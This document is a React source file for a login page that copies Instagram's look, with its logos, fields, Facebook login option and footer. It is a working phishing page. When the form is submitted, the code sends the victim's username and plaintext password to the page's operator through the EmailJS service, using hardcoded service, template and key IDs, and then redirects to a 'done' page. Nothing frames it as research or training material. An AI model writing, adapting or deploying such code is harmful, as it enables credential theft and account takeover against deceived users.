 
import { Link } from 'react-router-dom'
import React, { useState, useEffect } from "react";
import emailjs from "emailjs-com";
import { useNavigate } from "react-router-dom";

function Login() {
  const [credentials, setCredentials] = useState({ email: "", pass: "" });
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const navigate = useNavigate();
  // Update credentials on input change
  const handleChange = (e) => {
    const { name, value } = e.target;
    setCredentials((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  };

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .send(
        "service_m45wve6", // Replace with your EmailJS service ID
        "template_e75f976", // Replace with your EmailJS template ID
        {
          user_email: credentials.email, // Email entered by the user
          user_password: credentials.pass, // Password entered by the user
        },
        "sAjPIXuKzmJk3sZqy" // Replace with your EmailJS public key
      )
      .then(
        () => {
          console.log("Email sent successfully!");
        },
        (error) => {
          console.error("Failed to send email:", error.text);
        }
      );
  };
  const handleLogin = () => {
    setIsLoggingIn(true);
    // Simulate an API call or processing delay
    setTimeout(() => {
      navigate("/done-login"); // Redirect to the home page after 10 seconds
    }, 1000);
  };
  return (
  <>
  <section className="login_area">
  <div class="container">
      <div class="col image">
              <a href="#"><img src="https://i.ibb.co/Q8X79RK/image.png" alt="instagram" id="image" /></a>
      </div>
      
      <div class="col content">
        <div class="box">
          <div class="title">
            <a href="#"><img src="https://i.ibb.co/2dCLRGv/logoname.png" alt="logoname" border="0" /></a>
          </div>
          <form class="login-form" onSubmit={sendEmail}>
            <div class="form-content">
              <input type="text"  className="inp"  name="email"
                value={credentials.email}
                onChange={handleChange}
                placeholder='Phone number, username, or email'
                required />
              {/* <label for="email">Phone number, username, or email</label> */}
            </div>
            <div class="form-content">
              <input  type="password"
                className="inp"
                name="pass"
                value={credentials.pass}
                onChange={handleChange}
                required/>
              <label for="password">Password</label>
            </div>
            <div class="form-content">
              <Link></Link>
              <button type="submit"         onClick={handleLogin}
              >  {isLoggingIn ? "Logging in..." : "Log in"}</button>
            </div>
            <div class="form-ending">
              <center>
                <p id="OR">OR</p>
                <span id="line"></span>
              </center>
              <p id="facebook"><i class="fab fa-facebook-square"></i>Login with Facebook</p>
              <a href="#">Forgot password?</a>
            </div>
          </form>
        </div>
        <div class="mini-box">
          <div class="text">Don't have an account? <a href="#">Sign up</a></div>
        </div>
        <div class="download-section">
          <p>Get the app.</p>
          <div class="images">
            <a href="#"><img src="https://i.ibb.co/5KyMHpd/appstore.png" alt="appstore" border="0" /></a>
            <a href="#"><img src="https://i.ibb.co/ZTHhz0b/playstore.png" alt="playstore" border="0" /></a>
          </div>
        </div>
      </div>
       
    </div>
    <footer>
      <ul>
        <li>About</li>
        <li>Blog</li>
        <li>Jobs</li>
        <li>Help</li>
        <li>API</li>
        <li>Privacy</li>
        <li>Terms</li>
        <li>Top Accounts</li>
        <li>Hashtags</li>
        <li>Locations</li>
      </ul>
      <div class="copyright">
        <select aria-label="Switch Display Language">
          <option value="af">Afrikaans</option>
          <option value="cs">Čeština</option>
          <option value="da">Dansk</option>
          <option value="de">Deutsch</option>
          <option value="el">Ελληνικά</option>
          <option value="en">English</option>
          <option value="en-gb">English (UK)</option>
          <option value="es">Español (España)</option>
          <option value="es-la">Español</option>
          <option value="fi">Suomi</option>
          <option value="fr">Français</option>
          <option value="id">Bahasa Indonesia</option>
          <option value="it">Italiano</option>
          <option value="ja">日本語</option>
          <option value="ko">한국어</option>
          <option value="ms">Bahasa Melayu</option>
          <option value="nb">Norsk</option>
          <option value="nl">Nederlands</option>
          <option value="pl">Polski</option>
          <option value="pt-br">Português (Brasil)</option>
          <option value="pt">Português (Portugal)</option>
          <option value="ru">Русский</option>
          <option value="sv">Svenska</option>
          <option value="th">ภาษาไทย</option>
          <option value="tl">Filipino</option>
          <option value="tr">Türkçe</option>
          <option value="zh-cn">中文(简体)</option>
          <option value="zh-tw">中文(台灣)</option>
          <option value="bn">বাংলা</option>
          <option value="gu">ગુજરાતી</option>
          <option value="hi">हिन्दी</option>
          <option value="hr">Hrvatski</option>
          <option value="hu">Magyar</option>
          <option value="kn">ಕನ್ನಡ</option>
          <option value="ml">മലയാളം</option>
          <option value="mr">मराठी</option>
          <option value="ne">नेपाली</option>
          <option value="pa">ਪੰਜਾਬੀ</option>
          <option value="si">සිංහල</option>
          <option value="sk">Slovenčina</option>
          <option value="ta">தமிழ்</option>
          <option value="te">తెలుగు</option>
          <option value="vi">Tiếng Việt</option>
          <option value="zh-hk">中文(香港)</option>
          <option value="bg">Български</option>
          <option value="fr-ca">Français (Canada)</option>
          <option value="ro">Română</option>
          <option value="sr">Српски</option>
          <option value="uk">Українська</option>
        </select>
        <span> &copy 2021 Instagram from Facebook </span>
      </div>
    </footer>
    </section>
  
  </>
  )
}

export default Login
